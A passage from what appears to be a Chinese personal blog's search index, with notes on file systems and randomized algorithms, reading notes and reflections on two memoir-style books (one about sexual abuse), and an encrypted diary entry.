title="文件系统对文件操作"></a>文件系统对文件操作</h3><ol><li>对记录的操作：检索所有记录；检索单个记录；插入、修改、删除一个记录。  </li><li>对文件的操作  <ul><li>基本操作：文件的创建（分配外存、建立目录项）、删除、读、写、截断、设置文件的读写位置。  </li><li>文件的打开和关闭  </li><li>文件属性操作：设置和修改文件的属性  </li><li>目录操作：建立、修改和删除目录  </li></ul></li></ol><p>文件的打开和关闭  </p><ul><li>OS对文件的操作过程可分为两步：  <ul><li>检索文件目录：找到指定文件属性及在外存上的位置；  </li><li>对文件实施相应的操作：读、写等。  </li></ul></li><li>为避免多次重复检索目录，当用户第一次请求对某一文件进行操作时，先利用Open系统调用将该文件打开。  </li><li>“打开” ：系统将文件的属性（目录信息）<strong>从外存复制到内存</strong>打开文件表中，并返回该表目的编号给用户，建立了用户与文件间的联系。以后若再访问此文件，则利用编号直接在内存中检索，从而节省大量的检索开销，提高了文件的操作速度。  </li><li>“关闭” ：当用户不再需要对该文件的操作时， OS将会把该文件从打开文件表中的表目上删除掉，从而切断用户与文件间的联系。  <h2 id="文件的逻辑结构"><a href="#文件的逻辑结构" class="headerlink" title="文件的逻辑结构"></a>文件的逻辑结构</h2>所谓“文件的结构”，是指以什么样的形式去组织一个文件。<br>用户总是从使用的角度组织文件，系统总是从存储的角度组织文件。<br>从<strong>用户使用角度</strong>组织的文件，称为文件的“<strong>逻辑结构</strong>”<br>从<strong>系统存储角度</strong>组织的文件，称为文件的“<strong>物理结构</strong>”。  </li></ul><p>文件的逻辑结构（文件组织）：从用户观点来看待文件的组织形式。用户用这种逻辑结构形式来实现存储、检索和加工文件中的数据。<br>文件的物理结构（文件存储结构）：文件在外存空间存放时的组织结构。  </p><h3 id="文件逻辑结构类型"><a href="#文件逻辑结构类型" class="headerlink" title="文件逻辑结构类型"></a>文件逻辑结构类型</h3><h4 id="有结构文件：即记录式文件（数据结构、数据库）"><a href="#有结构文件：即记录式文件（数据结构、数据库）" class="headerlink" title="有结构文件：即记录式文件（数据结构、数据库）"></a>有结构文件：即记录式文件（数据结构、数据库）</h4><p>把文件信息划分成一个个记录，存取以记录为单位进行，称这种文件的逻辑结构为“记录式文件”。<br>在这种文件中，每个记录顺序编号，称为“记录号”。<br>总有一个数据项能够唯一地标识记录，这种数据项称为记录的“主关键字”。记录中的其他项被称为“次关键字”。  </p><p>按照记录长度划分：  </p><ul><li>定长记录：所有记录的长度是相同的。  </li><li>变长记录：各记录的长度不相同。指数据项数目不同或数据项本身长度不定。  </li></ul><p>记录：是一个具有内部结构的用于描述一个实体多方面属性的信息单位。  </p><h4 id="无结构文件：即流式文件"><a href="#无结构文件：即流式文件" class="headerlink" title="无结构文件：即流式文件"></a>无结构文件：即流式文件</h4><p>把文件视为有序的字符集合，其内部不再对信息进行组织划分，称这种文件的逻辑结构为“流式文件”。<br>流式文件以<strong>字符</strong>为操作对象，适用于进行字符流的正文处理。<br>如源程序、库函数等<br>由字符序列组成的文件，其内部不再划分结构，字符是该文件的基本信息单位<br>在UNIX系统中，所有的文件都被看作是流式文件：即使是有结构的文件，也被视为流式文件，系统不对文件进行格式处理，文件的含义由用户程序进行解释。  </p><h4 id="有结构文件组织方式"><a href="#有结构文件组织方式" class="headerlink" title="有结构文件组织方式"></a>有结构文件组织方式</h4><p>按照记录组织方式划分：  </p><ul><li>顺序文件：一系列记录按一定顺序排列成的文件。常是定长记录。  </li><li>索引文件：为每条记录设置一表项，以记录该记录的信息。常是变长记录。  </li><li>索引顺序文件：以记录分组，每组内为顺序的；每一组设置一个表项，形成索引表。  </li></ul><h3 id="顺序文件"><a href="#顺序文件" class="headerlink" title="顺序文件"></a>顺序文件</h3><ol><li>逻辑记录的排序  <ul><li>串结构：根据记录生成的先后顺序排列。  </li><li>顺序结构：记录按关键字排列。  </li></ul></li><li>对顺序文件的读或写操作  <ul><li>若顺序文件中的记录是<strong>定长</strong>的，则有当前记录的逻辑地址，就可得出下一记录的逻辑地址。<br>设L为记录长度，<br>读指针为Rptr，则Rptr: = Rptr + L；<br>写指针为Wptr，则Wptr: = Wptr + L  </li><li>而在<strong>变长</strong>记录文件中，L要换成<strong>Li</strong>，为刚读（写）完记录的长度。<br> 每个记录前面用1个单元存放记录长度  </li></ul></li><li>顺序文件的优缺点  <ul><li>优点：<br>批量存取时效率高，可存储在磁带上；<br>对定长记录，还可方便实现直接存取。  </li><li>缺点：<br>对变长记录，直接存取低效，对某一记录操作时，查找费时多；<br>增加或删除记录时，实现困难。  </li></ul></li></ol><h3 id="索引文件"><a href="#索引文件" class="headerlink" title="索引文件"></a>索引文件</h3><p>引入:为解决<strong>变长记录</strong>文件的直接存取低效问题。<br>对于顺序结构文件，若是定长记录，则第i个的位置可看作Ai=i×L；<br>而若是变长记录，则需(L1+L2+…+Li)+i<br>解决方法：为变长记录建立一张索引表，每个记录在索引表中占一项，如图。索引项按照记录中的某个关键字域<br>排序，索引表本身是一个定长记录的顺序文件，易于直接存取某一项。<br>检索过程：  </p><ol><li>根据提供的关键字值，查找索引表（可用顺序或折半等方法）。  </li><li>找到该记录对应的表项，根据指向记录的指针值访问记录。  </li></ol><p>优点：记录大小不必相同，不必排序，索引文件的记录项通常较小，查找速度快，便于随机访问(random access)；易于进行文件的增删。<br>缺点：索引表的存在，占用了存储空间。  </p><h3 id="索引顺序文件"><a href="#索引顺序文件" class="headerlink" title="索引顺序文件"></a>索引顺序文件</h3><p>将所有记录分为若干组，建立一张索引表，表项中记录每组中第一条记录的信息，如该记录的关键字值、指向该记录的指针。<br>每一组和整个大文件都应是<strong>按关键字顺序排列</strong>的。<br>检索过程：  </p><ol><li>根据提供的关键字值，先查找索引表（可用顺序或折半等方法）。  </li><li>找到该记录所在记录组的第一个记录的表项，读相关表项，找到该记录在文件中的位置。  </li><li>再顺序查找文件，以得到要找的记录。<br>索引顺序文件即把原顺序文件<strong>分组、分级</strong>，可减少查找次数。若记录个数很多时，也可建立多级索引，把索引表文件再建立索引表。<br>索引文件与索引顺序文件的区别在于索引文件中主文件不排序。  <h3 id="直接文件"><a href="#直接文件" class="headerlink" title="直接文件"></a>直接文件</h3>直接文件：根据记录关键字值，直接获得指定记录的物理地址。<br>关键字本身就决定了记录的物理地址<br>由关键字到记录物理的转换称为键值转换<br>问题：用什么方法实现记录值到物理地址的转换？<br>一种实现方式：哈希文件  <h3 id="哈希（Hash）文件"><a href="#哈希（Hash）文件" class="headerlink" title="哈希（Hash）文件"></a>哈希（Hash）文件</h3>目前应用最广泛的一种直接文件<br>记录位置由哈希函数确定: A = H(K)<br>例：K为记录键值， H(k)称为哈希函数，函数值A为k对应的记录在文件中位置  <h2 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h2></li></ol><h2 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h2><h2 id="文件保护"><a href="#文件保护" class="headerlink" title="文件保护"></a>文件保护</h2>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《房思琪的初恋乐园》 林奕含</title>
      <link href="/2020/reading-note/%E3%80%8A%E6%88%BF%E6%80%9D%E7%90%AA%E7%9A%84%E5%88%9D%E6%81%8B%E4%B9%90%E5%9B%AD%E3%80%8B%E6%9E%97%E5%A5%95%E5%90%AB/"/>
      <url>/2020/reading-note/%E3%80%8A%E6%88%BF%E6%80%9D%E7%90%AA%E7%9A%84%E5%88%9D%E6%81%8B%E4%B9%90%E5%9B%AD%E3%80%8B%E6%9E%97%E5%A5%95%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E6%88%BF%E6%80%9D%E7%90%AA%E7%9A%84%E5%88%9D%E6%81%8B%E4%B9%90%E5%9B%AD%E3%80%8B.jpg" alt="封面" loading="lazy"></p><a id="more"></a>  <h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><h3 id="推荐语"><a href="#推荐语" class="headerlink" title="推荐语"></a>推荐语</h3><ol><li>走过危机四伏的成长，我们每个人都是青春的幸存者。  </li></ol><h3 id="第一章-乐园"><a href="#第一章-乐园" class="headerlink" title="第一章 乐园"></a>第一章 乐园</h3><ol><li>世界上愈是黑白分明的事情愈是要出错的。  </li><li>”伊纹姐姐说：“恋爱啊，恋爱是不一样的，柏拉图说人求索他缺失的另一半，那就是说两个人合在一起才是完整，可是合起来就变成一个了，你们懂吗？像你们这样，无论缺少或多出什么都无所谓，因为有一个人与你镜像对称，只有永远合不起来，才可以永远做伴。”  </li></ol><h3 id="第二章-失乐园"><a href="#第二章-失乐园" class="headerlink" title="第二章 失乐园"></a>第二章 失乐园</h3><ol><li>一个搪瓷娃娃小女孩卖弄聪明，只会让容貌显得张牙舞爪。  </li><li>一个丑小女孩耍小聪明，别人只觉得疯癫。  </li><li>最终让李国华决心走这一步的是房思琪的自尊心。一个如此精致的小孩是不会说出去的，因为这太脏了。自尊心往往是一根伤人伤己的针，但是在这里，自尊心会缝起她的嘴。  </li><li>“我只是想找个有灵性的女生说说话。”她的鼻孔笑了：“自欺欺人。”  </li><li>她的羞耻心，正是他不知羞耻的快乐的渊薮。  </li><li>他发现社会对性的禁忌感太方便了，强暴一个女生，全世界都觉得是她自己的错，连她都觉得是自己的错。  </li><li>是一维哥哥自己先把相扣的手指松开，变成巴掌和拳头的。  </li><li>什么样的关系是正当的关系？在这个你看我我看你的社会里，所谓的正确不过就是与他人相似而已。  </li><li>为你浪费的时间比其他时间都好，都更像时间。  </li><li>写实主义里，爱上一个人，因为他可爱，一个人死了，因为他该死，讨厌的角色作者就在阁楼放一把火让他摔死——但现实不是这样的，人生不是这样的。  </li><li>我现在常常写日记，我发现，跟姐姐说的一样，书写，就是找回主导权，当我写下来，生活就像一本日记本一样容易放下。  </li><li>为什么这个世界是这个样子？为什么所谓教养就是受苦的人该闭嘴？  </li><li>姐姐，我好失望，但我不是对你失望，这个世界，或是生活、命运，或叫它神，或无论叫它什么，它好差劲，我现在读小说，如果读到赏善罚恶的好结局，我就会哭，我宁愿大家承认人间有一些痛苦是不能和解的，我最讨厌人说经过痛苦才成为更好的人，我好希望大家承认有些痛苦是毁灭的，我讨厌大团圆的抒情传统，讨厌王子跟公主在一起，正面思考是多么媚俗！可是姐姐，你知道我更恨什么吗？我宁愿我是一个媚俗的人，我宁愿无知，也不想要看过世界的背面。  </li><li>我愿意堕入面团地狱里，生生世世擀面皮。用一辈子擀一张你可以安稳走在上面饿了就挖起来吃的面皮。  </li><li>原来，人对他者的痛苦是毫无想象力的，一个恶俗的语境——有钱有势的男人，年轻貌美的小三，泪涟涟的老婆——把一切看成一个庸钝语境，一出八点档，因为人不愿意承认世界上确实存在非人的痛苦，人在隐约明白的当下就会加以否认，否则人小小的和平就显得坏心了。  </li><li>这个世界，人不是感情贫乏，就是泛滥。  </li><li>太好了，灵魂要离开身体了，我会忘记现在的屈辱，等我再回来的时候，我又会是完好如初的。  </li></ol><h3 id="第三章-复乐园"><a href="#第三章-复乐园" class="headerlink" title="第三章 复乐园"></a>第三章 复乐园</h3><ol><li>忍耐不是美德，把忍耐当成美德是这个伪善的世界维持它扭曲的秩序的方式，生气才是美德。  </li><li>一维不能确定这一切是伊纹所谓的“不知老之将至”，还是“老而不死是为贼”，或者是“我虽穿过死荫的幽谷，也不怕遭害，因你与我同在”。  </li></ol><h3 id="任何关于性的暴力，都是整个社会一起完成的。"><a href="#任何关于性的暴力，都是整个社会一起完成的。" class="headerlink" title="任何关于性的暴力，都是整个社会一起完成的。"></a>任何关于性的暴力，都是整个社会一起完成的。</h3><ol><li>强暴是社会性的谋杀  </li><li>啊原来我今天又侥幸地活下来了。  </li></ol><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><ol><li>“文学是最徒劳的，且是滑稽的徒劳。写这么多，我不能拯救任何人，甚至不能拯救自己。这么多年，我写这么多，我还不如拿把刀冲进去杀了他。真的。”  </li></ol><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>真的很恶心，道貌岸然的老师、丈夫做出令人发指的事情。<br>尤其是在刘怡婷去找老师对线的时候，让她也感受一下房思琪的痛苦、绝望。<br>尤其是在自己还骂她、说她脏之后。<br>思琪真的很让人心疼。<br>我现在真的觉得，幸存是多么一件值得庆幸的事情啊。<br>这个世界上，有那么多与我不相上下的女孩子，经历这种非人的折磨。<br>被强奸最难之处，既要抵住他人的谩骂，也要承受自己都觉得的肮脏。<br>希望那个不管发生了什么，都会被接纳的世界早点到来。  </p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《你当像鸟飞往你的山》塔拉·韦斯特弗</title>
      <link href="/2020/reading-note/%E3%80%8A%E4%BD%A0%E5%BD%93%E5%83%8F%E9%B8%9F%E9%A3%9E%E5%BE%80%E4%BD%A0%E7%9A%84%E5%B1%B1%E3%80%8B%E5%A1%94%E6%8B%89%C2%B7%E9%9F%A6%E6%96%AF%E7%89%B9%E5%BC%97/"/>
      <url>/2020/reading-note/%E3%80%8A%E4%BD%A0%E5%BD%93%E5%83%8F%E9%B8%9F%E9%A3%9E%E5%BE%80%E4%BD%A0%E7%9A%84%E5%B1%B1%E3%80%8B%E5%A1%94%E6%8B%89%C2%B7%E9%9F%A6%E6%96%AF%E7%89%B9%E5%BC%97/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E4%BD%A0%E5%BD%93%E5%83%8F%E9%B8%9F%E9%A3%9E%E5%BE%80%E4%BD%A0%E7%9A%84%E5%B1%B1%E3%80%8B.jpg" alt="封面" loading="lazy"></p><a id="more"></a>  <h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><h3 id="引语"><a href="#引语" class="headerlink" title="引语"></a>引语</h3><ol><li>过去总是美好的，因为一个人从来都意识不到当时的情绪；它后来扩展开来，因此我们只对过去，而非现在，拥有完整的情绪。——弗吉尼亚·伍尔夫  </li></ol><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><ol><li>我被山间的节律养育，在这节律中没有根本性的变化，只有周而复始的转变。太阳每天清晨照常升起，扫过山谷，最后坠入山峰后面。冬天落下的雪总是在春天融化。我们的生活在轮回——四季轮回，昼夜轮回——在永恒的变换中轮回，每完成一次轮回，就意味着一切未有任何改变。我曾相信我们一家是这不朽模式中的一部分，相信从某种意义上来说，我们会永生。但永生只属于大山。  </li></ol><h3 id="助产士"><a href="#助产士" class="headerlink" title="助产士"></a>助产士</h3><ol><li>当我拿到第一份证明我是个人的法律证据时，我的感觉怪怪的，就好像权利被人剥夺了：在此之前，我从未意识到这还需要证明。  </li></ol><h3 id="奶油色鞋子"><a href="#奶油色鞋子" class="headerlink" title="奶油色鞋子"></a>奶油色鞋子</h3><ol><li>偏执狂和原教旨主义如何瓜分了我的人生，它们如何把我在乎的人从我身边带走，只留下学位和证书——一种体面的虚空。现在正在发生的以前也曾发生。母女分离再度重演。磁带在循环播放。  </li></ol><h3 id="阿帕奇女人"><a href="#阿帕奇女人" class="headerlink" title="阿帕奇女人"></a>阿帕奇女人</h3><ol><li>想起汇而构成人一生的所有决定——人们共同或者独自做出的那些决定，聚合起来，制造了每一桩单独事件。沙粒不可计数，叠压成沉积物，然后成为岩石。  </li></ol><h3 id="诚实的污垢"><a href="#诚实的污垢" class="headerlink" title="诚实的污垢"></a>诚实的污垢</h3><ol><li>泰勒步入了一片虚空。我不知道他为什么这么做，他也不知道。他无法解释这个信念从何而来，也无法解释它是如何发出明亮的光来穿透那黑暗的不确定。但我一直猜想那来自他脑海中的音乐，来自我们其他人听不到的充满希望的曲调，来自他买三角学书和收藏铅笔屑时一直哼唱的秘密旋律。  </li></ol><h3 id="大小盾牌"><a href="#大小盾牌" class="headerlink" title="大小盾牌"></a>大小盾牌</h3><ol><li>我在学习的这个技能至关重要，那就是对不懂的东西耐心阅读。  </li></ol><h3 id="小妓女"><a href="#小妓女" class="headerlink" title="小妓女"></a>小妓女</h3><ol><li>你越害怕某事，时间流逝得越快  </li></ol><h3 id="当时世代的完全人"><a href="#当时世代的完全人" class="headerlink" title="当时世代的完全人"></a>当时世代的完全人</h3><ol><li>人只相信自己的力量，而人力量微弱。  </li><li>在我看来，与那天早上相比，他更矮小了。他脸上的失望是如此孩子气，一时间我疑惑上帝怎么能不遂他的心愿。他是那样虔诚的信徒，心甘情愿地受苦，就像挪亚心甘情愿去建造方舟一样。但上帝并未让洪水泛滥。  </li></ol><h3 id="羽毛盾牌"><a href="#羽毛盾牌" class="headerlink" title="羽毛盾牌"></a>羽毛盾牌</h3><ol><li>身旁的那个人就是肖恩，我看着他，但看不透他。我不知道我看到了什么——在那极其暴力又富有同情心的行为背后，我到底召唤出了什么生物——但我想我看到了父亲，或者我所希望的父亲的样子，一位我渴望已久的守护者，一名想象出来的斗士，一个不会把我扔进暴风雪中的人，一个当我受了伤，能让我重新变得完整的人。  </li></ol><h3 id="直觉"><a href="#直觉" class="headerlink" title="直觉"></a>直觉</h3><ol><li>我这一生中，这些直觉一直在教导我一个道理——只有依靠自己，胜算才更大。  </li></ol><h3 id="我们的低语，我们的尖叫"><a href="#我们的低语，我们的尖叫" class="headerlink" title="我们的低语，我们的尖叫"></a>我们的低语，我们的尖叫</h3><ol><li>我从未允许自己拥有这样的特权：不确定，但拒绝让位于那些声称确定的人。我的一生都活在别人的讲述中。他们的声音铿锵有力，专制而绝对。之前我从未意识到，我的声音也可以与他们的一样有力。  </li></ol><h3 id="我来自爱达荷州"><a href="#我来自爱达荷州" class="headerlink" title="我来自爱达荷州"></a>我来自爱达荷州</h3><ol><li>好奇心是一种奢侈品，只有经济上有保障的人才有权享有。  </li></ol><h3 id="迷途的骑士"><a href="#迷途的骑士" class="headerlink" title="迷途的骑士"></a>迷途的骑士</h3><ol><li>这时我才开始体会到金钱的最大优势：考虑金钱以外的事情的能力。  </li></ol><h3 id="硫黄的作用"><a href="#硫黄的作用" class="headerlink" title="硫黄的作用"></a>硫黄的作用</h3><ol><li>多年来，我和父亲一直冲突不断，进行着永无休止的意志的较量。我以为我已经接受这一点，接受了我们那样的关系。但那一刻，我意识到我多么期望能结束我们之间的冲突，多么坚信将来我们会成为一对和平相处的父女。  </li></ol><h3 id="卖花女"><a href="#卖花女" class="headerlink" title="卖花女"></a>卖花女</h3><ol><li>决定你是谁的最强大因素来自你的内心。  </li></ol><h3 id="全能上帝之手"><a href="#全能上帝之手" class="headerlink" title="全能上帝之手"></a>全能上帝之手</h3><ol><li>他说积极自由是自制，由自我掌控的自我统治。他解释说，拥有积极自由就是控制自己的思想，从非理性的恐惧和信仰中解放出来，从上瘾、迷信和所有其他形式的自我强迫中解脱出来。  </li></ol><h3 id="悲剧之后的闹剧"><a href="#悲剧之后的闹剧" class="headerlink" title="悲剧之后的闹剧"></a>悲剧之后的闹剧</h3><ol><li>过去是一个幽灵，虚无缥缈，没什么影响力。只有未来才有分量。  </li></ol><h3 id="大房子里吵架的女人"><a href="#大房子里吵架的女人" class="headerlink" title="大房子里吵架的女人"></a>大房子里吵架的女人</h3><ol><li>他似乎想要打架，因为老人的死而惩罚自己。或者这种惩罚是因为她的一生中他们之间从未停歇的冲突。现在她死了，冲突才结束。  </li></ol><h3 id="物理的巫术"><a href="#物理的巫术" class="headerlink" title="物理的巫术"></a>物理的巫术</h3><ol><li>尽管这并非我所愿，我还是不想回家。我更喜欢自己选择的家庭，而不是被给予的家庭，所以我在剑桥越开心，我的开心就越因为觉得自己背叛了巴克峰而散发着恶臭。这种感觉变成了我身体的一部分，一种我可以在舌头上品尝、在呼吸中闻到的东西。  </li></ol><h3 id="事物的本质"><a href="#事物的本质" class="headerlink" title="事物的本质"></a>事物的本质</h3><ol><li>让这张脸，让这个女人与众不同的不是衣服，而是她眼睛后面的东西，是她咬在齿间的东西——是希望、信仰或信念——让人生不再一成不变。  </li></ol><h3 id="太阳以西"><a href="#太阳以西" class="headerlink" title="太阳以西"></a>太阳以西</h3><ol><li>我知道，作为一个从垃圾堆里爬出来的无知女孩，竟被允许去那样的地方读书，我应该感激涕零才是，但我丝毫提不起热情。我已开始思考教育让我付出的代价，开始对它心生怨恨。  </li></ol><h3 id="两双挥舞的手臂"><a href="#两双挥舞的手臂" class="headerlink" title="两双挥舞的手臂"></a>两双挥舞的手臂</h3><ol><li>当生活本身已经如此荒唐，谁知道什么才能算作疯狂？  </li><li>我所有的奋斗，我多年来的学习，一直为了让自己得到这样一种特权：见证和体验超越父亲所给予我的更多的真理，并用这些真理构建我自己的思想。我开始相信，评价多种思想、多种历史和多种观点的能力是自我创造力的核心。如果现在让步，我失去的将不仅仅是一次争论。我会失去对自己思想的掌控权。这就是要求我付出的代价，我现在明白了这一点。父亲想从我身上驱逐的不是恶魔，而是我自己。  </li></ol><h3 id="救赎之赌"><a href="#救赎之赌" class="headerlink" title="救赎之赌"></a>救赎之赌</h3><ol><li>精神崩溃的问题在于，不管你崩溃得多明显，你都会不以为然。你会想，我很好，所以我昨天连续看了二十四个小时的电视又有什么关系呢。我没有崩溃。我只是太懒。我不知道为什么认为自己懒惰比认为自己陷入困境要好。但那的确更好。不只更好：那至关重要。  </li></ol><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>看这本书的时候，就感觉很沉重，出生在这么一个思想守旧甚至可以说是偏激的家庭，作者的前半生是被蒙蔽的，学会了用父亲的眼光看这个世界。但所幸作者逃离出来了，获得了博士学位，还是很成功的。<br>当然，所有的事情不可能一帆风顺，没有经历过，我们无法想象一个人半夜惊醒，叫着喊着冲向大街上的恐惧。无法想象接连被好友、姐姐、父亲、母亲抛弃的绝望。真的无法想象。<br>我的内心充满了悲伤，每个人都无法选择自己的原生家庭，这真的很靠运气。<br>想起了一句话。有人长大后一直在治愈童年，而有的人长大后一直被童年治愈。<br>能被童年治愈的人多么幸运啊。我想要的也不过如此，快乐的生活。  </p><blockquote><p>过去是一个幽灵，虚无缥缈<br>但别被过去所缠绕，啊，缠绕自己的永远都是自己啊。<br>想不透，看不远，就永远会被琐事缠绕，庸人自扰啊。<br>过去已去，未来可期！<br>加油呀。  </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-5-14</title>
      <link href="/2020/diary/2020-5/2020-5-14/"/>
      <url>/2020/diary/2020-5/2020-5-14/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="42bc627fc5455eb01ba76f1a319b7da6b36a125646b53eb4f1195c220e4fdeb5">e32c27e47419b87d293b9e8ce412adf872abdec871a86781bedb7be890ae0d6f482b0fd25ca0218c872a67470ba46c9f0ca9c1fe449ec92d53bc6c22fd6c11a4e5664785f975ea762adc81c67945ed0ca178617802e77a35fd84a7aefb66b676639fde9d81e634309d56b6ba893e9fda8c04d5f99ea5b5e6cccdd943e0480cc5f457a3480a8ffd657ed5b4f03de1043223332d9c2f60d50257eef1e30a427df13f6a63fc87c0dcc11adee270d07c01222cc880697b4caf79e5e08ad36b8544af7b372513ac92d60a82d0c5ab67262eda57e750bfefc35fec4e58b21678de8e89314066f66f00308b4c44547d8d6a029e9be006a618518b9486d8a37eba48e66326279bb9114e6538c5034a674fe0d3d59679b5cf8039b9755b7f53cf870676fd1d37b87d14727202f7c1c43e25827ea4ad531e824024633d9955b2791567f3012304e496883eac5b49661051293a5fcb4854df16a8db8e7bc4d9a155e7beab035d0a89f6faa7bb90ae1cb0defe76a9e97c5bc104b3d502601b6cf9855e8fb396d4ec8a0c7413db3f4fce5bf7d6470c1a9149bb8d18ac75e4b86d8052d6a7e85be14b21df57712c3e0851825784dc79e1cb7bddffa6e1366ead4bdb4cfe24c7d88cc77093cdb49f0d9b36f4e775ad91c8cf18d3afdca6a5d41baa6e822c824d1869e60229c8355b0a6f9d8c432961e3e03605e2378c9f35890b4e5c0e866af21d3727c8acc36c8bbe6af44ace9d617ee5cd209b100de198264eb5f46ee280c54cc79a5306ea09d2c0eb9497c9394a32a74887fefd018a4a00b8fedd85ef8f6941a4a7e3d2410fad6ec988d6327b7e62f5dad247c0823f78198f7d38e5e72d92012da360a5b26609edc0c66f1c60418173dc21b91ae1aecaa397844d8ef54019efd841e36378642ea7c7003168d5ae6635cbca72f1795299db9eac44561b13cb41d13afdf08cbd8a464ef61dd87b7cd927c372f2016ae18f2e49e402361bc1759d80905f118dc4b9c0ede5fb6c2992161557b3489bad0372dbd397b438cb1d382ea80f5e63c206db1d2a0d18a0437ffb679a1bd31a1862c4ad84ce05a4d09d6c12f9c3ecc3dd6cfd9bdc6cea81d47cb4448a8de20502cc21d47b39524710366dce9e2f490932d82f088ae7e7cf80139ef917df2de6a0084c59fc14b7295756867907789ec0733384e8be015ccfe2a4d502f2f552a57f0864b5283522426c611e73474aa3d964b764ca187398b41617573a185724c11d4655cb196aa1751d1610e70dd81819f63d3ff11b9a9e138aac7620d6c25e5640257f4697bb3210cd113cfd5750c530ef74fdd79678b9ae083b1145c7682303f16fc2d1e14cb58925fd0a25a250d0da66c978722ec6d4e2450f5a2dbe0d5911927a55b20815fe0989b77368b3a1087bf6aeda670f8874fe5f33d053ada6530d22d7ddcd592e1092fafe6d14243ca8f87a79b26af03838398ec826415468d5329a9b0c626e833ebb4a01bd7dabdac7447b31690b9c1723dcd84988e00bb0f716283ef77bb95afa7fa01340c3</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随机化算法</title>
      <link href="/2020/ACM/%E9%9A%8F%E6%9C%BA%E5%8C%96%E7%AE%97%E6%B3%95/"/>
      <url>/2020/ACM/%E9%9A%8F%E6%9C%BA%E5%8C%96%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>随机化算法不等于近似算法，可以用于近似算法，也可以用于确定算法<br>使求解的复杂度比较均匀。</p><h2 id="典型算法"><a href="#典型算法" class="headerlink" title="典型算法"></a>典型算法</h2><h3 id="数值随机化算法"><a href="#数值随机化算法" class="headerlink" title="数值随机化算法"></a>数值随机化算法</h3><p>常用于数值问题的求解，往往得到近似解</p><h4 id="问题举例"><a href="#问题举例" class="headerlink" title="问题举例"></a>问题举例</h4><ol><li>用随机投点法计算pi值</li><li>计算定积分</li><li>解非线性方程组</li></ol><h3 id="舍伍德算法"><a href="#舍伍德算法" class="headerlink" title="舍伍德算法"></a>舍伍德算法</h3><p>总能求得一个正确的解</p><h4 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h4><p>设A是一个确定性算法，当它的输入实例为x时所需的计算时间记为tA(x)。当问题的输入规模为n时，算法A所需的平均时间为tA(n)。<br>希望获得一个随机化算法B，使得对问题的输入规模为n的每一个实例均有tB(x)=tA(n)+s(n).<br>当s(n)与tA(n)相比可忽略时，舍伍德算法可获得很好的平均性能。</p><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><ol><li>高效的数据结构跳跃表<br>改造跳跃表，增加跳跃指针，与二分查找概率有关。</li></ol><h3 id="拉斯维加斯（Las-Vegas）算法"><a href="#拉斯维加斯（Las-Vegas）算法" class="headerlink" title="拉斯维加斯（Las Vegas）算法"></a>拉斯维加斯（Las Vegas）算法</h3><p>不会得到不正确的解<br>类似瞎猫碰死老鼠，<strong>随机试探法</strong>,反复实验。<br>比如买彩票，小概率事件</p><h4 id="基本思想-1"><a href="#基本思想-1" class="headerlink" title="基本思想"></a>基本思想</h4><p>拉斯维加斯算法不会得到不正确的解。一旦用拉斯维加斯算法找到一个解，这个解就一定是正确解。</p><p>拉斯维加斯算法的一个显著特征是它所作的随机性决策有可能导致算法找不到所需的解。</p><p>拉斯维加斯算法找到正确解的概率随着它所用的计算时间的增加而提高。对于所求解问题的任一实例，用同一拉斯维加斯算法反复对该实例求解足够多次，可使求解失败的概率任意小。</p><p>拉斯维加斯算法可以解决排序问题、分班问题、考试系统安排问题、ad-hoc基于距离的动态概率广播协议问题、航天器与短期空间碎云碰撞问题等。</p><h4 id="算法框架模型"><a href="#算法框架模型" class="headerlink" title="算法框架模型"></a>算法框架模型</h4><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">obstinate</span><span class="token punctuation">(</span>Object x<span class="token punctuation">,</span> Object y<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 反复调用拉斯维加斯算法LV(x,y)，直到找到问题的一个解y</span>  <span class="token keyword">bool</span> success<span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>success<span class="token punctuation">)</span> success<span class="token operator">=</span><span class="token function">lv</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 